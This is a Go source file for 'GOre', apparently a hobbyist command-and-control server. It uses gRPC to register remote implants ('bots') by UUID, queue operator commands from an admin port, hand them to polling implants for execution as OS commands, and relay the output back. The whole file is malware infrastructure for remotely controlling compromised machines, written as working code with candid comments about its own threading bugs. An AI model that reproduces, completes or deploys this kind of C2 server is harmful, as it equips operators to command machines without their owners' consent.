package main

import (
	"context"
	"fmt"
	"gore/grpcapi" //the pain to get this to work was immense. Golang needs to slow the fuck down and stop depreciating packages.
	"log"
	"net"

	"google.golang.org/grpc"
)

// TODO: make this not in-memory, and instead be an indexable database.
// gloablly accessable map for UUID's to implant structs
var implant_map = map[string]implantServer{}

/*It should be said, I think that these commands are invoked automatically, based on the RPC that was recieved, as the server decides what to do and when to do it. We don't invoke these explicitly, yet they are invoked.*/
// create a struct for handling commands
type implantServer struct {
	work, output chan *grpcapi.Command //create a new thread to handle commands, in Golang this is defined by the "chan" type or "channel".
	uuid         string                //store UUID strings to be indexable
}

// we need to have a seperate admin struct for handling admin commands, that way we don't run OS commands on the server, only on clients
type adminServer struct {
	work, output chan *grpcapi.Command //thread for admin services
	target_uuid  string
}

// we impliment these sepertaly to keep them mutally exclusive. Each one has a a channel for sending/recieving work and command output.
func NewImplantServer(work, output chan *grpcapi.Command) *implantServer { //returns a pointer to implant server
	s := new(implantServer) //instantiate a struct of implantServer, name it s
	//s.implant_work = implant_work //assign work
	s.work = work     //assign work
	s.output = output //assign output
	return s          //return the struct.
}

// similar to instantiating an inplant server
func NewAdminServer(work, output chan *grpcapi.Command) *adminServer { //returns a pointer to admin server
	s := new(adminServer) //instantiate a struct of implantServer, name it s
	s.work = work         //assign work
	s.output = output     //assign output
	return s              //return the struct.
}

// ctx is part of the built-in golang package "context", it is used for the creation/handling of API calls, without shitting the bed when multiple calls are made at the same time like
// in a RESTful API. it's a bit more complex, but should pay off in the end. Also, according to Docs for context, it is a bad idea/not allowed to pass in NIL for a context value,
// nessecitating the need for our own "Empty" message value.
// define the methods of our structs. Thats what the pointers to structs mean prior to the function definitions. it's OOP baby.

// TODO: implant UUID selection should occur here. It seems that once a new implant is registered, that is the one that fetches.
// we need to basically enumerate through every implant we have to give them a chance to check for thier work.
func (s *implantServer) SendCommand(ctx context.Context, implant_uuid *grpcapi.Registration) (*grpcapi.Command, error) { //this acts as basically a polling mechanism, asking for work.
	var cmd = new(grpcapi.Command) //instantiate a new command from the grpcapi.
	//var cmd2 = new(grpcapi.Command)
	//get the tageted implant by uuid
	req_uuid := implant_uuid.GetUuid()
	fmt.Println("[+] implant requesting's uuid: ", req_uuid)
	//cmd2 = <-s.work
	//fmt.Println("[+] cmd2: ", cmd2)
	//_, implant := implant_map[req_uuid]
	fmt.Println("[+] cmd uuid: ", cmd.Uuid)
	//this is a bit complex...
	//if it's blocking, why not put it in its own goroutine?
	//this is the UUID of whoever registered last...
	/*TODO: maybe ditch the select statement in it's entrity and instead do a for-loop with goroutines to make sure that the command
	/is shared between channel connections?*/
	//iterate through the entire map
	//check for a match
	/*if implant_map[req_uuid] == *s {
		cmd, ok := <-s.implant_work
		//assert ok
		if ok {
			return cmd, nil

		} else {
			fmt.Println("[-] cmd not OK")
		}
	}
	return cmd, nil*/

	//if cmd.Uuid == s.uuid {
	//for {
	select { //switch statement
	// <- is passing a value from a channel to a reference, similar to dequeing from a queue of jobs for multithreads/goroutines
	//this is also nonblocking and will run the default case if there is nothing to do.

	case cmd, ok := <-s.work: //used to be <-s.work
		//this certainly made it faster...
		//implant_map[cmd.Uuid].implant_work <- cmd
		if cmd.Uuid == req_uuid { //check if command was successful
			if ok {
				fmt.Println("[+] CMD: ", cmd)
				fmt.Println("[+] CMD UUID: ", cmd.Uuid)
				return cmd, nil
			}
		} else {
			fmt.Println("[+] added the work back to the channel")
			s.work <- cmd
		}
		//this NEVER happens.
		//return cmd, errors.New("[!] Channel closed.") //otherwise, return an error that the channel closed
	default:
		// if all the above fails, then no work is present
		return cmd, nil
	}
	//break
	//}
	return cmd, nil
}

// this command will push the command onto the queue or the output channel/goroutine
func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	s.output <- result
	return &grpcapi.Empty{}, nil
}

// TODO:
// There is some multi-threading or implant managment issues that is leading to undefined behaviour. This cannot continue.

// running of a command for our admin component; we push it to the Goroutine queue and have it be handled by multithreading.
func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, error) {
	var res *grpcapi.Command //assign res as a command struct
	//set up goroutine, doing os in this way is a type of closure, and this goroutine can access cmd from outside this fucntion.

	//grab UUID from cmd
	uuidstr := cmd.GetUuid()
	//check key existance
	implant, key := implant_map[uuidstr]
	fmt.Println("[+] requested implant's uuid: ", implant.uuid)
	//assume that a UUID was given by an operator
	if key {
		//functionality for targeted implant bahaviour
		go func() {
			implant_map[uuidstr].work <- cmd //used to be s not implant
			//grab from the implant_map data structure
			//implant_map[uuidstr].work <- cmd
		}()
		//assign command output to result, ie telling us if it ran properly.
		res = <-implant_map[uuidstr].output //used to be s not implant
		//res = <-implant_map[uuidstr].output
	} else {
		//not the best solution for now

		//res = error
		/*for key, _ := range implant_map {
			go func() {
				implant_map[key].work <- cmd
			}()
			res = <-implant_map[key].output //no idea if this works
		}*/
		fmt.Println("[-] UUID was not found/not supplied.")
	}
	//either way, return the output to the operator
	return res, nil
}

// handle UUID
func (s *implantServer) RegisterNewImplant(ctx context.Context, uuid_result *grpcapi.Registration) (*grpcapi.Empty, error) {
	//var res *grpcapi.Registration
	uuidstr := uuid_result.GetUuid()
	//work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
	//mplant := NewImplantServer(work, output)

	fmt.Println(uuidstr)
	fmt.Println("[+] Recieved new registration request")
	//add uuid to the list that we have.
	//uuid_list = append(uuid_list, uuidstr)
	s.uuid = uuidstr //IDK if this is needed.
	//implant_list = append(implant_list, *s)
	//first, check if key is in the map
	_, key := implant_map[uuidstr]
	if !key {

		implant_map[uuidstr] = *s
		//this may be uneeded.
	} else {
		fmt.Println("[:] Duplicate registration request recieved, updating records.")
		implant_map[uuidstr] = *s
	}
	//debug printing for server admin
	fmt.Println("[+] Printing lists of registerd UUID's and implants:")
	//fmt.Printf("%+q\n", implant_map)
	fmt.Println("--------------------------------------------")
	for key, value := range implant_map {
		fmt.Println(key, value)
		//fmt.Println("[+] sanity check: ", implant_map[key] == *s) //evaluates as expected, for now. Each one is different and self == self!
	}
	//return nil as I don't want to return something to the client.
	return &grpcapi.Empty{}, nil
}

//func (s *adminServer) ListRegisteredImplants(ctx context.Context, )
/*
the main server loop will run two seperate servers; one for getting requests from the admin clinet (that client being the one that we send our commands to for the server to parse)
and another server will be the one that communicates to the bots via polling. These servers are only logically different, not physically, so a takedown of the physical server will
lead to both being flatlined.
*/
func main() {
	//variables for main driver
	var (
		implantListener, adminListener net.Listener          //two listeners
		err                            error                 //errors
		opts                           []grpc.ServerOption   //server options
		work, output                   chan *grpcapi.Command //work and output goroutines
		//implant_work                   chan *grpcapi.Command
	)

	//TODO: load file and read TLS data

	//create channels for passing input and output commands to implant and admin services
	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
	//instantiate a new implant to act as a device client and an admin server. We're doing this on the same channel, so IPC between them is shared on the same goroutine.
	//implant := NewImplantServer(work, output)
	admin := NewAdminServer(work, output) //both share the same work and output
	//open and bind port 5000 on localhost on the server to listen to commands over tcp, check if nil and log a fatal error if so
	/*if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 5000)); err != nil {
		fmt.Println("[-] implantListener has failed.")
		log.Fatal(err)
	}*/
	//do the same for an admin server, with a differnet port of course
	if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
		fmt.Println("[-] adminListener has failed.")
		log.Fatal(err)
	}
	fmt.Println("[+] GOre server has started successfully.")
	//the "..." operator implies an input with a variable number of inputs, kinda like explicit function overloading. We declare that opts might have more variables associated with them than we specify.
	grpcAdminServer := grpc.NewServer(opts...)
	//grpcImplantServer := grpc.NewServer(opts...)
	//register the servers. Do note we never explicitly defined these, protoc did. By compiling our .proto file, it gave us Golang functions for fri.
	//grpcapi.RegisterImplantServer(grpcImplantServer, implant)

	grpcapi.RegisterAdminServer(grpcAdminServer, admin)
	//use goroutines to serve implants
	go func() {
		//work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
		//implant_work = make(chan *grpcapi.Command)
		//instantiate a new implant to act as a device client and an admin server. We're doing this on the same channel, so IPC between them is shared on the same goroutine.
		implant := NewImplantServer(work, output)
		if implantListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 5000)); err != nil {
			fmt.Println("[-] implantListener has failed.")
			log.Fatal(err)
		}
		grpcImplantServer := grpc.NewServer(opts...)
		grpcapi.RegisterImplantServer(grpcImplantServer, implant)

		grpcImplantServer.Serve(implantListener)
	}()
	//admin server is not multithreaded, only one is allowed.
	grpcAdminServer.Serve(adminListener)

}
